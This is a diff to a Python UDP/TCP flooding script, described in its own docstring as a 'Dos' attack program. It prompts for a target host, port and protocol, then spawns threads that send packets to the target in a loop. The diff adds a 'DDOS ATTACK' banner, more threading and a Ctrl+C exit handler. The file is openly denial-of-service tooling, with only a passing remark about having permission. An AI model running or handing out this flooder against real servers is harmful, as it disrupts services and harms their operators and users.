@@ -3,18 +3,23 @@ UDP Flooder.
 This is a 'Dos' attack program to attack servers, you set the IP always that you have permission to do it.
 and the port and the amount of seconds and it will start flooding to that server.
 Created by Xavi Fortes -> https://github.com/XaviFortes/Python-UDP-Flood
-Usage : ./flood_udp 
+Usage : ./flood_udp
 Press enter to continue and introduce the data.
 """
+import signal
 import time
 import socket
 import random
 import threading
 import sys
+import os
+from os import system, name
 
-def usage():
-    print("==> Code by Karasu <==")
-start = str(input("==> Code by Karasu <=="))
+print("\033[1;34;40m \n")
+os.system("figlet DDOS ATTACK -f slant")
+print("\033[1;33;40m If you have any issue post a thread on https://github.com/XaviFortes/Python-UDP-Flood/issues\n")
+
+print("\033[1;32;40m ==> Code by Karasu <==  \n")
 ip = str(input(" Host/Ip:"))
 port = int(input(" Port:"))
 choice = str(input(" UDP(y/n):"))
@@ -31,6 +36,7 @@ def run():
 				s.sendto(data,addr)
 			print(i +"Packet Sent!!!")
 		except:
+			s.close()
 			print("[!] Error!!!")
 
 def run2():
@@ -55,3 +61,58 @@ for y in range(threads):
 	else:
 		th = threading.Thread(target = run2)
 		th.start()
+
+def new():
+	for y in range(threads):
+		if choice == 'y':
+			th = threading.Thread(target = run)
+			th.start()
+		else:
+			th = threading.Thread(target = run2)
+			th.start()
+
+def whereuwere():
+    print("Aww man, I'm so sorry, but I can't remember if u were in TCP or UDP")
+    print("Put 1 for UDP and 2 for TCP")
+    whereman = str(input(" 1 or 2 >:("))
+    if whereman == '1':
+        run()
+    else:
+        run2()
+
+def clear():
+	# for windows
+    if name == 'nt':
+        _ = system('cls')
+
+    # for mac and linux(here, os.name is 'posix')
+    else:
+        _ = system('clear')
+
+def byebye():
+	clear()
+	os.system("figlet Youre Leaving Sir -f slant")
+	sys.exit(0)
+
+def exit_gracefully(signum, frame):
+    # restore the original signal handler as otherwise evil things will happen
+    # in raw_input when CTRL+C is pressed, and our signal handler is not re-entrant
+    signal.signal(signal.SIGINT, original_sigint)
+
+    try:
+        exitc = str(input(" You wanna exit bby <3 ?:"))
+        if exitc == 'y':
+
+            byebye()
+
+    except KeyboardInterrupt:
+        print("Ok ok, quitting")
+        byebye()
+
+    # restore the exit gracefully handler here
+    signal.signal(signal.SIGINT, exit_gracefully)
+
+if __name__ == '__main__':
+    # store the original SIGINT handler
+    original_sigint = signal.getsignal(signal.SIGINT)
+    signal.signal(signal.SIGINT, exit_gracefully)
